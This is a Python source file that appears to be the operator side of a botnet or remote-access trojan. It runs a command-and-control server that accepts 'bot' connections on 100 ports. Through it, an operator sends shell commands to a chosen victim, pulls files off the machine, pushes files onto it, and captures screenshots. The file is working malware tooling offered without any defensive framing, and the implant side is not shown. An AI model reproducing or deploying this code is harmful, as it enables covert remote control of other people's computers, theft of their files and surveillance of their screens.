import socket
from threading import Thread
import os

chunk_size = 2048
eof = "<end_of_file>"
end_result = "<end_of_result>"
threads = []
clients = []


# Connection Information
def listen_for_bots(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen()
    bot, bot_address = sock.accept()
    clients.append(bot)


# Main Script Codes
def main():
    print("[+] Server bot waiting for incoming connections")

    startig_port = 8090

    bots = 100

    for i in range(bots):
        t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)
        threads.append(t)
        t.start()
    # bot, bot_address = s.accept()
    run_cnc = True
    while run_cnc:
        if len(clients) != 0:
            for i, c in enumerate(clients):
                print("\t\t", i, "\t", c.getpeername())

            selected_client = int(input("[+] Select client by index: "))
            bot = clients[selected_client]
            run_bot = True
            while run_bot:
                while True:
                    command = input("> ")
                    bot.send(command.encode())
                    if command.lower() == "exit":
                        run_bot = False
                        break
                    elif command == "":
                        continue
                        #  d:
                    elif len(command) == 2 and command[0].isalpha() and command[1] == ":":
                        bot.send(command.encode())
                        continue
                    elif command.startswith("cd"):
                        bot.send(command.encode())
                        continue

                    elif command.startswith("download"):
                        bot.send(command.encode())
                        exists = bot.recv(1024)
                        if exists.decode() == "yes":
                            file_name = command.strip("download ")
                            with open(file_name, "wb") as download_file:
                                print("Downloading file")
                                while True:
                                    chunk = bot.recv(chunk_size)
                                    if chunk.endswith(eof.encode()):
                                        chunk = chunk[:-len(eof)]
                                        download_file.write(chunk)
                                        break
                                    download_file.write(chunk)
                            print("Successfully downloaded, ", file_name)
                        else:
                            print("File doesn't exist")

                    elif command.startswith("upload"):
                        file_to_upload = command.strip("upload ")
                        if os.path.exists(file_to_upload) and os.path.isfile(file_to_upload):
                            exists = "yes"
                            bot.send(exists.encode())
                            answer = bot.recv(1024)
                            if answer.decode() == "yes":
                                with open(file_to_upload, "rb") as file:
                                    chunk = file.read(chunk_size)
                                    print("Uploading FIle ... ")
                                    while len(chunk) > 0:
                                        bot.send(chunk)
                                        chunk = file.read(2048)
                                        # This will run till the end of file.

                                    # once the file is complete, we need to send the marker.
                                    bot.send(eof.encode())
                                print("File sent successfully")
                        else:
                            exists = "no"
                            print("File doesn't exist")
                            bot.send(exists.encode())
                            continue
                    elif command == "screenshot":
                        print("taking screenshot")
                        file_name = bot.recv(1024)
                        exists = bot.recv(1024)
                        if exists.decode() == "yes":
                            answer = "yes"
                            bot.send(answer.encode())
                            with open(file_name, "wb") as download_file:
                                print("Downloading Screenshot")
                                while True:
                                    chunk = bot.recv(chunk_size)
                                    if chunk.endswith(eof.encode()):
                                        chunk = chunk[:-len(eof)]
                                        download_file.write(chunk)
                                        break
                                    download_file.write(chunk)
                            print("File Downloaded successfully")
                            run_bot = False
                        else:
                            print("File not exists")
                            continue
                    else:
                        full_result = b''
                        while True:
                            chunk = bot.recv(1024)
                            if chunk.endswith(end_result.encode()):
                                chunk = chunk[:-len(end_result)]
                                full_result += chunk
                                print(full_result.decode())
                                break
                            else:

                                full_result += chunk
                # End
            status = bot.recv(1024)
            if status == "disconnected".encode():
                bot.close()
                clients.remove(bot)


        else:
            print("[+] No clients connected")
            ans = input("[+] Do you want to exit? press [y/n]  ")
            if ans == "y":
                run_cnc = False
            else:
                run_cnc = True


# Call THe main Function To Execute Codes
if __name__ == "__main__":
    main()
